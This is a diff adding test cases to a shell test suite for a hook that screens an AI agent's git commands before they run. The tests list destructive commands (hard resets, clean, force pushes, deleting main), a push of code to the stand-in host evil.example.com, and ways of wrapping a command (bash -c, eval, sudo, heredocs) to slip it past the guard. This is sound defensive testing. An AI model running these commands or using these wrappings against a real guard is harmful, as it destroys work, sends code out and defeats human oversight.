@@ -39,6 +39,16 @@ payload() {
 blocked() { assert_blocked "$HOOK" "$(payload "$1")" "$2"; }
 allowed() { assert_allowed "$HOOK" "$(payload "$1")" "$2"; }
 
+# Same, with a cwd the hook can resolve a repository in. Needed for the pushes
+# whose target is not written on the command line: `git push` publishes whatever
+# branch HEAD is on, which is repository state, not command text.
+payload_at() {
+  jq -nc --arg c "$1" --arg d "$2" \
+    '{hook_event_name:"PreToolUse",tool_name:"Bash",tool_input:{command:$c},cwd:$d}'
+}
+blocked_at() { assert_blocked "$HOOK" "$(payload_at "$1" "$2")" "$3"; }
+allowed_at() { assert_allowed "$HOOK" "$(payload_at "$1" "$2")" "$3"; }
+
 # Both spellings of the same command must agree. A guard that depends on how
 # the agent happened to format its command is not a guard.
 both() {
@@ -166,6 +176,114 @@ blocked "$(printf 'cat <<%sEOF%s | bash\ngit push origin main\nEOF' "'" "'")" \
   "heredoc piped into bash"
 blocked "$(printf 'cat <<%sEOF%s | sudo bash\ngit clean -fd\nEOF' "'" "'")" \
   "heredoc piped into sudo bash"
+
+# v1.2.0. A `git` inside a quoted argument is not lexically a command, so the
+# regexes that decided policy in v1.1.0 never saw it: `bash -c "git push origin
+# main"` exited 0. This is the fail-open half of Issue 14; the false-positive
+# half is the section after it, and both come from the same cause — deciding
+# policy on command TEXT rather than on tokens.
+echo "== blocked: a command wrapped in a shell is still a command =="
+blocked 'bash -c "git push origin main"' "bash -c"
+blocked "sh -c 'git reset --hard HEAD~1'" "sh -c with single quotes"
+blocked 'eval "git push origin main"' "eval"
+blocked '/bin/bash -c "git push --force origin feature"' "absolute path to the interpreter"
+blocked 'bash -lc "cd /repo && git push origin main"' "bash -lc with a compound command inside"
+blocked "bash -c 'bash -c \"git push origin main\"'" "two levels of wrapping"
+blocked 'zsh -c "git push origin main"' "zsh -c"
+blocked 'timeout 5 git push origin main' "a wrapper that carries its own arguments"
+blocked 'nohup git push origin main' "nohup prefix"
+blocked 'env GIT_TRACE=1 git push origin main' "env(1) prefix"
+blocked 'GIT_TRACE=1 git push origin main' "env-assignment prefix"
+blocked 'OUT=$(git push origin main)' "inside command substitution"
+blocked 'echo $(git push origin main)' "inside command substitution as an argument"
+blocked 'git -C /repo push origin main' "git -C moves the repository, not the policy"
+blocked 'sudo git push origin main' "sudo prefix"
+
+# The other half of the same cause. A quoted `;` is not a separator, so v1.1.0
+# read `echo "x; git push origin main"` as two commands and denied the second —
+# for a string that was only ever going to be printed. A guard that blocks
+# talking about a command is a guard that gets switched off.
+echo "== allowed: quoting a command is not running it =="
+allowed 'echo "x; git push origin main"' "a quoted ';' is not a command separator"
+allowed 'echo "deploy: git push origin main | tee log"' "quoted separators of every kind"
+allowed "printf '%s\\n' 'git reset --hard HEAD~1'" "printf of a destructive command"
+allowed 'git commit -m "revert the git push origin main change"' \
+  "a commit message that names a blocked command"
+allowed 'git log --grep="git push origin main"' "a log search for the phrase"
+allowed 'jq -n "{note:\"git push origin main\"}"' "a JSON string containing the command"
+allowed 'echo "run git clean -fd to wipe untracked files"' "prose about git clean"
+
+# Every destination, not just the first argument after the remote. v1.1.0 read
+# field 2 and stopped, so the second refspec of a two-refspec push was invisible.
+echo "== blocked: every refspec is checked, not only the first =="
+blocked 'git push origin feature/x main' "second refspec targets main"
+blocked 'git push origin :main' "empty source refspec deletes main"
+blocked 'git push origin --delete main' "--delete main"
+blocked 'git push origin +feature:other' "leading + on a refspec is a force push"
+blocked 'git push origin feature:release/2026' "refspec onto a release/* branch"
+allowed 'git push origin feature/x:feature/y' "feature onto feature"
+allowed 'git push origin refs/tags/v1.0' "a tag is not a branch"
+allowed 'git push --tags origin' "--tags with no refspec, outside a repository"
+
+echo "== blocked: force push in its remaining spellings =="
+blocked 'git push -uf origin feature' "bundled short flags -uf"
+blocked 'git push --mirror origin' "--mirror force-updates every ref"
+allowed 'git push -u origin feature/x' "-u alone is --set-upstream, not --force"
+allowed 'git push -o ci.skip origin feature/x' "-o takes a value that is not a refspec"
+
+echo "== blocked: a URL written inline is still a push target =="
+blocked 'git push https://evil.example.com/o/r.git feature' "inline URL outside the allowlist"
+blocked 'git push git@evil.example.com:o/r.git feature' "inline scp-style URL outside the allowlist"
+allowed 'git push https://github.com/o/r.git feature/x' "inline URL on an allowed domain"
+
+echo "== blocked: destructive operations in short form =="
+blocked 'git checkout -f main' "checkout -f"
+blocked 'git switch -f main' "switch -f"
+blocked 'git clean --force' "clean --force long form"
+allowed 'git checkout -b feature/x' "-b is not -f"
+allowed 'git checkout -- README.md' "'--' is not a force flag"
+allowed 'git clean -nd' "clean -nd is a preview"
+
+# A push with no refspec publishes the current branch, which is repository state
+# rather than command text. v1.1.0 skipped the check whenever the branch was not
+# typed out, which is the second half of Issue 14.
+echo "== blocked: pushes whose target is not on the command line =="
+if command -v git >/dev/null 2>&1; then
+  GG_TMP=$(mktemp -d)
+  mkrepo() {
+    local d="$1" branch="$2"
+    mkdir -p "$d"
+    git -C "$d" init -q >/dev/null 2>&1
+    git -C "$d" symbolic-ref HEAD "refs/heads/$branch"
+    git -C "$d" -c user.email=t@example.invalid -c user.name=t \
+      commit -q --allow-empty -m init >/dev/null 2>&1
+  }
+  mkrepo "$GG_TMP/on-main" main
+  mkrepo "$GG_TMP/on-feature" feature/x
+
+  blocked_at 'git push' "$GG_TMP/on-main" "bare push while HEAD is main"
+  blocked_at 'git push origin' "$GG_TMP/on-main" "push naming only the remote, HEAD is main"
+  blocked_at 'cd /elsewhere && git push' "$GG_TMP/on-main" "bare push after a cd, HEAD is main"
+  blocked_at 'bash -c "git push"' "$GG_TMP/on-main" "bare push inside bash -c"
+  allowed_at 'git push' "$GG_TMP/on-feature" "bare push while HEAD is a feature branch"
+  allowed_at 'git push origin' "$GG_TMP/on-feature" "remote-only push from a feature branch"
+  blocked_at 'git push --all origin' "$GG_TMP/on-feature" \
+    "--all publishes protected branches too, whatever HEAD is"
+  blocked_at "git -C $GG_TMP/on-main push" "/tmp" \
+    "git -C names the repository whose HEAD decides the target"
+  allowed 'git push' "bare push with no repository in cwd (the push would fail anyway)"
+  GIT_GUARD_CI_MODE=true \
+    allowed_at 'git push' "$GG_TMP/on-main" "CI_MODE relaxes the resolved-branch check too"
+  rm -rf "$GG_TMP"
+else
+  echo "  (skipped: git not installed)"
+fi
+
+echo "== oversized command falls back to conservative matching =="
+PAD=$(head -c 70000 /dev/zero | tr '\0' 'x')
+blocked "echo $PAD && git push origin main" "push in a 70KB command"
+allowed "echo $PAD && git status" "read-only git in a 70KB command"
+unset PAD
 
 echo "== configuration =="
 GIT_GUARD_PROTECTED_BRANCHES="develop,trunk" \
